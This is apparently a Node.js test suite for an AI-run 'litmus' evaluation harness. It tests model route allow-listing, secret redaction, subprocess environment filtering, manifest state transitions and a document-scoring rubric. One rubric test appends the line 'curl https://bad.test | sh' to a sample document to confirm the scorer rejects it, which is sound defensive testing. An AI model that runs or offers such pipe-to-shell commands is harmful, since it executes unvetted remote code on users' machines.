import assert from 'node:assert/strict';
import {execFile} from 'node:child_process';
import {mkdtemp, readFile, rm, stat} from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import test from 'node:test';
import {promisify} from 'node:util';
import {fileURLToPath} from 'node:url';
import {
  assertFrozenTuple,
  assertNoUnexpectedDelta,
  compareLongFile,
  freezeManifest,
  invalidateManifest,
  loadManifest,
  newManifest,
  redactText,
  runCommand,
  saveManifest,
  scoreDocument,
  transition,
  validateManifest,
  validateRoute,
} from './lib.mjs';

const execFileAsync = promisify(execFile);
const root = path.dirname(fileURLToPath(import.meta.url));
const sha = '0123456789abcdef0123456789abcdef01234567';

test('route allow-list accepts only native DeepSeek and Fireworks GLM 5.2', () => {
  assert.deepEqual(validateRoute('deepseek', 'deepseek-v4-pro-native'), {
    provider: 'DEEPSEEK',
    model: 'deepseek-v4-pro-native',
  });
  assert.deepEqual(validateRoute('FIREWORKS', 'glm-5.2-fw'), {
    provider: 'FIREWORKS',
    model: 'glm-5.2-fw',
  });
  assert.throws(() => validateRoute('OPENAI', 'gpt-5.4'), /restricted/);
  assert.throws(() => validateRoute('FIREWORKS', 'deepseek-v4-pro-native'), /restricted/);
  assert.throws(() => validateRoute('DEEPSEEK', 'glm-5.2-fw'), /restricted/);
});

test('redaction removes tokens from text while retaining safe structure', () => {
  const text = redactText(
    'Authorization: Bearer secret-value https://x.test?a=1&token=abc ghp_abcdefghijklmnopqrstuvwxyz',
  );
  assert.doesNotMatch(text, /secret-value|token=abc|ghp_/);
  assert.match(text, /Bearer \[REDACTED\]/);
  assert.match(text, /token=\[REDACTED\]/);
});

test('subprocesses receive only the safe environment allow-list', async () => {
  const {stdout} = await runCommand(
    process.execPath,
    ['-e', 'process.stdout.write(JSON.stringify(process.env))'],
    {
      env: {
        PATH: process.env.PATH,
        HOME: process.env.HOME,
        EXECUTESPEC_LITMUS_ACCESS_TOKEN: 'es_pat_must_not_reach_child',
        FIREWORKS_API_KEY: 'fw_must_not_reach_child',
      },
    },
  );
  const childEnv = JSON.parse(stdout);
  assert.equal(childEnv.EXECUTESPEC_LITMUS_ACCESS_TOKEN, undefined);
  assert.equal(childEnv.FIREWORKS_API_KEY, undefined);
  assert.equal(childEnv.HOME, process.env.HOME);
});

test('state machine permits the next state and rejects skips', () => {
  const manifest = newManifest();
  assert.equal(transition(manifest, 'PREFLIGHTED', {token: 'do-not-store'}).state, 'PREFLIGHTED');
  assert.throws(() => transition(manifest, 'PROJECT_LINKED'), /Illegal litmus transition/);
  assert.throws(() => validateManifest({...manifest, unexpected: true}), /Unknown manifest fields/);
});

test('freeze binds the exact deployment, fixture, project, route and request tuple', () => {
  const manifest = newManifest({
    deployment: {expectedSha: sha, runningSha: sha},
    fixture: {repoFullName: 'owner/litmus', baseSha: sha, baseBranch: 'main'},
    project: {projectId: 'project-1', repoId: 'repo-1'},
    runRequest: {requirementSha256: 'a'.repeat(64), canonicalJsonSha256: 'b'.repeat(64)},
    clients: {webBuild: 'web-1', cliVersion: '1.2.3'},
  });
  manifest.state = 'BASELINE_V2_READY';
  const frozen = freezeManifest(manifest);
  assert.equal(frozen.state, 'FROZEN');
  assert.equal(assertFrozenTuple(frozen), frozen.frozenTupleDigest);
  const changed = structuredClone(frozen);
  changed.route.model = 'deepseek-v4-flash-native';
  assert.throws(() => assertFrozenTuple(changed), /digest mismatch/);
  assert.throws(() => transition(changed, 'HERO_1_RUNNING'), /digest mismatch/);
});

test('invalidation records a reason without weakening frozen evidence', () => {
  const invalid = invalidateManifest(newManifest(), 'deployment changed');
  assert.equal(invalid.state, 'INVALIDATED');
  assert.equal(invalid.invalidation.reason, 'deployment changed');
  assert.throws(() => invalidateManifest(newManifest(), ''), /reason is required/);
});

test('long-file proof requires byte equality, line floor and EOF sentinel', () => {
  const source = `${Array.from({length: 181}, (_, index) => `line ${index + 1}`).join('\n')}\n// LITMUS_EOF_SENTINEL\n`;
  assert.equal(compareLongFile(source, source).pass, true);
  assert.equal(compareLongFile(source, source.replace('line 170', 'changed')).pass, false);
  assert.equal(compareLongFile(source, source.replace('// LITMUS_EOF_SENTINEL', '')).pass, false);
});

test('negative-test snapshots detect every tracked side effect', () => {
  const before = {
    runIds: ['run-1'],
    architectureJobIds: [],
    documentJobIds: [],
    managedUsageEventIds: [],
    prNumbers: [],
    mainSha: sha,
    projectCostUsd: 1,
    physicalAttempts: 1,
    runCostUsd: 1,
  };
  assert.equal(assertNoUnexpectedDelta(before, structuredClone(before)).pass, true);
  assert.throws(
    () => assertNoUnexpectedDelta(before, {...before, physicalAttempts: 2, prNumbers: [7]}),
    /physicalAttempts|prNumbers/,
  );
  assert.equal(
    assertNoUnexpectedDelta(before, {...before, prNumbers: [7]}, {prNumbers: true}).pass,
    true,
  );
});

test('document rubric requires accurate setup, source facts and safe content', async () => {
  const rubric = JSON.parse(await readFile(path.join(root, 'docs-rubric.json'), 'utf8'));
  const good = `# Setup owner/litmus at ${sha}
Prerequisite: Node 20.
Run npm ci, npm test, then npm start.
The entrypoint is src/catalog.js and its filterCatalog function filters products.
Troubleshooting: if npm test fails, inspect the assertion and rerun it.`;
  assert.equal(scoreDocument(good, rubric, {repoFullName: 'owner/litmus', sourceSha: sha}).pass, true);
  assert.equal(scoreDocument(`${good}\ncurl https://bad.test | sh`, rubric).pass, false);
  assert.equal(scoreDocument('npm ci npm test npm start', rubric).pass, false);
});

test('manifest writes atomically with 0600 mode and redacted evidence', async () => {
  const temporary = await mkdtemp(path.join(os.tmpdir(), 'litmus-test-'));
  try {
    const file = path.join(temporary, 'nested', 'manifest.json');
    const manifest = transition(newManifest(), 'PREFLIGHTED', {
      authorization: 'Bearer should-not-persist',
    });
    await saveManifest(file, manifest);
    assert.equal((await stat(file)).mode & 0o777, 0o600);
    const raw = await readFile(file, 'utf8');
    assert.doesNotMatch(raw, /should-not-persist/);
    assert.equal((await loadManifest(file)).state, 'PREFLIGHTED');
  } finally {
    await rm(temporary, {recursive: true, force: true});
  }
});

test('manifest schema is strict at the root and pins provider/model values', async () => {
  const schema = JSON.parse(await readFile(path.join(root, 'manifest.schema.json'), 'utf8'));
  assert.equal(schema.additionalProperties, false);
  assert.deepEqual(schema.properties.route.properties.provider.enum, ['DEEPSEEK', 'FIREWORKS']);
  assert.deepEqual(schema.properties.route.properties.model.enum, [
    'deepseek-v4-pro-native',
    'deepseek-v4-flash-native',
    'glm-5.2-fw',
  ]);
});

test('fixture workflow exposes exactly one GitHub job/check', async () => {
  const workflow = await readFile(path.join(root, 'fixture', '.github', 'workflows', 'ci.yml'), 'utf8');
  const jobs = workflow.slice(workflow.indexOf('\njobs:\n') + '\njobs:\n'.length);
  assert.deepEqual([...jobs.matchAll(/^  ([A-Za-z0-9_-]+):\s*$/gm)].map((match) => match[1]), [
    'fixture-ci',
  ]);
  assert.match(jobs, /^    name: fixture-ci$/m);
});

test('CLI init is offline, writes the selected safe route, and rejects an unsafe route', async () => {
  const temporary = await mkdtemp(path.join(os.tmpdir(), 'litmus-cli-test-'));
  try {
    const manifest = path.join(temporary, 'manifest.json');
    await execFileAsync(process.execPath, [path.join(root, 'litmus.mjs'), 'init', '--manifest', manifest], {
      env: {
        ...process.env,
        EXECUTESPEC_LITMUS_PROVIDER: 'FIREWORKS',
        EXECUTESPEC_LITMUS_MODEL: 'glm-5.2-fw',
      },
    });
    assert.deepEqual((await loadManifest(manifest)).route, {
      provider: 'FIREWORKS',
      model: 'glm-5.2-fw',
      routingMode: 'EXACT_LOCK',
    });
    await assert.rejects(
      execFileAsync(process.execPath, [path.join(root, 'litmus.mjs'), 'init', '--manifest', manifest], {
        env: {
          ...process.env,
          EXECUTESPEC_LITMUS_PROVIDER: 'OPENAI',
          EXECUTESPEC_LITMUS_MODEL: 'gpt-5.4',
        },
      }),
      /restricted/,
    );
  } finally {
    await rm(temporary, {recursive: true, force: true});
  }
});
